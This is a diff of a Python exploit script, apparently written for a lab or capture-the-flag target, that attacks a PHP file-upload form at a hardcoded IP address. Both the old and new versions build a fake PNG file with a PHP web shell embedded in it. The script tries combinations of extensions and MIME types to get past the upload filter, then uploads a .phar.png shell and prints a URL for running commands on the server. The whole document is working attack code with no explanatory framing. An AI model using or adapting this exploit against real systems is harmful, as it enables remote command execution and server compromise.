@@ -1,73 +1,82 @@
 import requests
-import mimetypes
-from io import BytesIO
+import os
+import io
+from datetime import datetime
 
-def generate_malicious_png(php_payload):
-    # PNG header
-    png_header = b'\x89PNG\r\n\x1a\n'
+# ========== Configuration ==========
+URL = "http://94.237.60.55:38666/contact/upload.php"  # Change to actual target upload URL
+UPLOAD_FIELD = "uploadFile"
+PROXIES = {
+    "http": "http://127.0.0.1:8080",   # Set Burp proxy
+    "https": "http://127.0.0.1:8080"
+}
+USE_PROXY = False  # Set to False to disable Burp proxy
 
-    # Fake IHDR chunk (minimal valid)
-    ihdr_chunk = b'\x00\x00\x00\x0D' + b'IHDR' + b'\x00'*13 + b'\x00\x00\x00\x00'
+# ========== Helpers ==========
 
-    # Embed PHP payload in IDAT chunk
-    idat_data = b'<?php ' + php_payload.encode() + b' ?>'
-    idat_chunk = (
-        len(idat_data).to_bytes(4, 'big') +
-        b'IDAT' + idat_data + b'\x00\x00\x00\x00'
-    )
+def build_payload():
+    """Create a valid PNG file with PHP payload on a new line."""
+    png_header = b"\x89PNG\r\n\x1a\n"  # PNG signature
+    ihdr_chunk = b"\x00\x00\x00\rIHDR" + os.urandom(13)  # Fake IHDR
+    php_payload = b"\n<?php system($_GET['cmd']); ?>"
+    
+    final_data = png_header + ihdr_chunk + php_payload
+    return final_data
 
-    # IEND chunk
-    iend_chunk = b'\x00\x00\x00\x00IEND\xaeB`\x82'
+def try_upload(extension, content_type):
+    """Try uploading with given extension and content type."""
+    filename = f"test.{extension}"
+    file_data = build_payload()
 
-    return png_header + ihdr_chunk + idat_chunk + iend_chunk
-
-def enumerate_extensions_and_types(url):
-    print("[*] Enumerating extensions and content-types...")
-
-    allowed = []
-    test_exts = ['png', 'jpg', 'gif', 'svg']
-    for ext in test_exts:
-        filename = f'test.{ext}'
-        files = {'uploadFile': (filename, b'test', f'image/{ext}')}
-        r = requests.post(url, files=files)
-        if "Only images are allowed" not in r.text and "Extension not allowed" not in r.text:
-            allowed.append(ext)
-
-    print(f"[+] Allowed extensions: {allowed}")
-    return allowed
-
-def upload_file(url, filename, file_data, content_type):
     files = {
-        'uploadFile': (filename, file_data, content_type)
+        UPLOAD_FIELD: (filename, io.BytesIO(file_data), content_type)
     }
-    r = requests.post(url, files=files)
-    if r.status_code == 200:
-        print("[+] Upload response:")
-        print(r.text)
-    else:
-        print("[-] Upload failed.")
-    return r
 
-def main():
-    target_url = 'http://94.237.60.55:57390/contact/upload.php'  # CHANGE ME
-    upload_path = '/contact/user_feedback_submissions/'  # Based on PHP code
-    php_payload = 'system($_GET["cmd"]);'
+    try:
+        response = requests.post(URL, files=files, proxies=PROXIES if USE_PROXY else None, verify=False)
+        print(f"[+] Tried: {filename} ({content_type}) => {response.status_code} | {response.text[:100]}")
+        return response.text
+    except Exception as e:
+        print(f"[-] Error uploading: {e}")
 
-    allowed_exts = enumerate_extensions_and_types(target_url)
-    if not allowed_exts:
-        print("[-] No allowed extensions found.")
-        return
+def enumerate_allowed():
+    """Enumerate allowed extensions and MIME types."""
+    extensions = ["png", "jpeg", "jpg", "gif", "svg", "phar.png"]
+    content_types = [
+        "image/png",
+        "image/jpeg",
+        "image/gif",
+        "image/svg+xml",
+        "application/octet-stream"
+    ]
+    
+    print("[*] Enumerating combinations...")
+    for ext in extensions:
+        for ctype in content_types:
+            try_upload(ext, ctype)
 
-    print("[*] Generating malicious .phar.png...")
-    malicious_png = generate_malicious_png(php_payload)
-    filename = 'rce.phar.png'
-    content_type = 'image/png'
+def upload_shell():
+    """Upload final payload with .phar.png and valid PNG header."""
+    now = datetime.now().strftime('%y%m%d')
+    filename = f"{now}_test.phar.png"
+    payload = build_payload()
 
-    print("[*] Uploading payload...")
-    r = upload_file(target_url, filename, BytesIO(malicious_png), content_type)
+    files = {
+        UPLOAD_FIELD: (filename, io.BytesIO(payload), "image/png")
+    }
 
-    uploaded_url = f"{target_url.rsplit('/', 1)[0]}{upload_path}{filename}"
-    print(f"[+] If successful, access the file at: {uploaded_url}?cmd=whoami")
+    print(f"[*] Uploading final payload: {filename}")
+    response = requests.post(URL, files=files, proxies=PROXIES if USE_PROXY else None, verify=False)
+    print(f"[+] Server response: {response.status_code}")
+    print(response.text[:300])
+
+    print(f"[!] If successful, try accessing: /user_feedback_submissions/{filename}?cmd=uptime")
+
+# ========== Main ==========
 
 if __name__ == "__main__":
-    main()
+    print("[*] Starting enumeration...")
+    enumerate_allowed()
+
+    #input("\n[>] Press Enter to upload final shell...\n")
+    upload_shell()
